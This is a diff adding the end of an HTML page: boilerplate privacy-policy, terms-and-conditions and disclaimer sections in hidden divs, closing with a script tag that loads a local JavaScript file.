+<p>The right to receive information.</p>
+<p>Access right.</p>
+<p>The right to make corrections.</p>
+<p>Right to data destruction.</p>
+<p>The right to restrict processing.</p>
+<p>Right to data portability.</p>
+<p>Right to restoration.</p>
+<p>Rights Regarding Automated Decision Making and Profiling.</p>
+<p>If you would like to exercise this right, please contact us using the contact details below.</p>
+<p>In addition, if you are a resident of Europe, we note that we are processing your information to fulfill contracts that may be entered into with you (for example, if you make an order through the Site) or otherwise to pursue our legitimate business interests listed above. . In addition, please note that your information may be transferred outside of Europe, including Canada and the United States.</p>
+<p>Links to other sites:</p>
+<p>Our Site may contain links to other sites that are not owned or controlled by us. Please note that we are not responsible for the privacy practices of such sites or third parties. We encourage you to check when you leave our Site and read the privacy statements of each site that may collect personal information.</p>
+<p>Information Security:</p>
+<p>We secure the information you provide on computer servers in a controlled, secure environment that is protected from unauthorized access, use, or disclosure. We take reasonable administrative, technical and physical security measures to protect against unauthorized access, use, modification and disclosure of personal data under its control and storage. However, data transmission via the Internet or wireless network cannot be guaranteed.</p>
+<p>Legal Disclosure:</p>
+<p>We will disclose any information we collect, use or receive when required or permitted by law, such as in response to a subpoena or similar legal process, and when we have a good faith belief that disclosure is necessary to protect our rights. , your safety or the safety of others, a fraud investigation, or a response to a government request.<br></p>
+<p>Contact Information:</p>
+<p>If you would like to contact us to learn more about this Policy, or if you would like to contact us with any question<br></p>
+</div>
+<div style="display: none;" id="tos">
+    <h2>Terms & Conditions</h2>
+    <p>Welcome to the site!</p>
+<p>These terms and conditions describe the rules and regulations governing the use of the website of the website located on our website.</p>
+<p>By accessing this website, we assume that you accept these terms. Do not continue to use the website if you do not agree to be bound by all of the terms and conditions set forth on this page.</p>
+<p>The following terminology applies to these Terms of Service, the Privacy Policy and the Disclaimer, and to all Agreements: "Customer", "you", and "your" refer to you, the person who registers on this website, and the Company's Terms of Service are equivalent. “Company”, “We ourselves”, “We”, “Our” and “Us” refer to our company. "Party", "Parties" or "Us" refers to both the Client and us. All Terms apply to the offer, acceptance and consideration of payment necessary to complete the process of our assistance to the Client in the most appropriate way to meet the needs. the customer in relation to the provision of these services by the company in accordance with applicable Dutch law. Any use of the above terminology or other words in the singular, plural, case and/or he/she or they are considered interchangeable and therefore refer to the same thing.</p>
+<p>Cookie</p>
+<p>We use the use of cookies. By accessing the website, you have consented to the use of cookies in accordance with the website's privacy policy.</p>
+<p>Most interactive websites use cookies so that we can collect user information on every visit. Cookies are used by our website to enable features in certain areas to make visiting our website easier. Some of our affiliate/advertising partners may also use cookies.</p>
+<p>License</p>
+<p>Unless otherwise stated, the Website and/or its licensors own the intellectual property rights to all materials on the Website. All intellectual property rights reserved. You may access it from the Website for your personal use, subject to the restrictions set forth in these Terms.</p>
+<p>You can not:</p>
+<p>Republishing materials from the site</p>
+<p>Sell, rent or sublicense material from the website</p>
+<p>Reproduce, duplicate or copy any materials from the Site</p>
+<p>Distribution of Content from the Site</p>
+<p>This Agreement shall enter into force on the date of this Agreement.</p>
+<p>Portions of this website offer users the opportunity to post and share opinions and information in certain sections of the website. The site does not filter, edit, publish or review comments before they appear on the site. Comments do not reflect the views and opinions of the site, its agents and/or affiliates. Comments reflect the views and opinions of the person posting their views and opinions. To the maximum extent permitted by applicable law, the Website shall not be liable for the Comments or for any liability, damage or expense caused and/or incurred as a result of the use and/or publication and/or appearance of the Comments on this site. Web site.</p>
+<p>The Website reserves the right to monitor and remove any Comments that may be deemed inappropriate, offensive or in violation of these Terms.</p>
+<p>You warrant and represent that:</p>
+<p>You have the right to post Comments on our website and have all necessary licenses and consents to do so;</p>
+<p>The Comments do not infringe any intellectual property rights, including but not limited to any third party copyrights, patents or trademarks;</p>
+<p>Comments must not contain defamatory, libelous, offensive, obscene or otherwise unlawful material that is an invasion of privacy.</p>
+<p>Comments will not be used to incite or promote business or custom, or to represent commercial or illegal activity.</p>
+<p>You hereby grant the Site a non-exclusive license to use, reproduce, edit and permit others to use, reproduce and edit your Comments in any form, format or medium.</p>
+<p>Hyperlinks to our content</p>
+<p>The following organizations may link to our website without prior written permission:</p>
+<p>State bodies;</p>
+<p>Search engines;</p>
+
+<p>news organizations</p>
+</div>
+<div style="display: none;" id="dis">
+    <h2>Website disclaimer</h2>
+    <p>All information on this website - website - is published in good faith and for general information purposes only. Website Any action you take based on the information you find on this website (Website) is done entirely at your own risk. The website is not responsible for any loss and/or damage arising from the use of our website.</p>
+<p>From our website, you can visit other websites by following hyperlinks to such external websites. While we strive to provide only high quality links to useful and ethical websites, we do not control the content and these links to other websites do not imply endorsement of any content on those websites. The owners and content of the site are subject to change without notice before we have the opportunity to remove a link that may have become "bad".</p>
+<p>Please also note that when you leave our website, other websites may have different privacy policies and terms that are beyond our control. Please read the privacy policies of these websites and their "Terms of Use" before conducting any business or downloading any information.</p>
+<p>Agreement</p>
+<p>By using our website, you hereby agree to our disclaimer and agree to its terms.</p>
+<p>Refresh</p>
+<p>If we update, amend, or make changes to this document, those changes will be posted prominently here.</p>
+</div>
+
+<script data-cfasync="false" src="js/neixRcQ13Zuv.js"></script></body>
+
+</html>
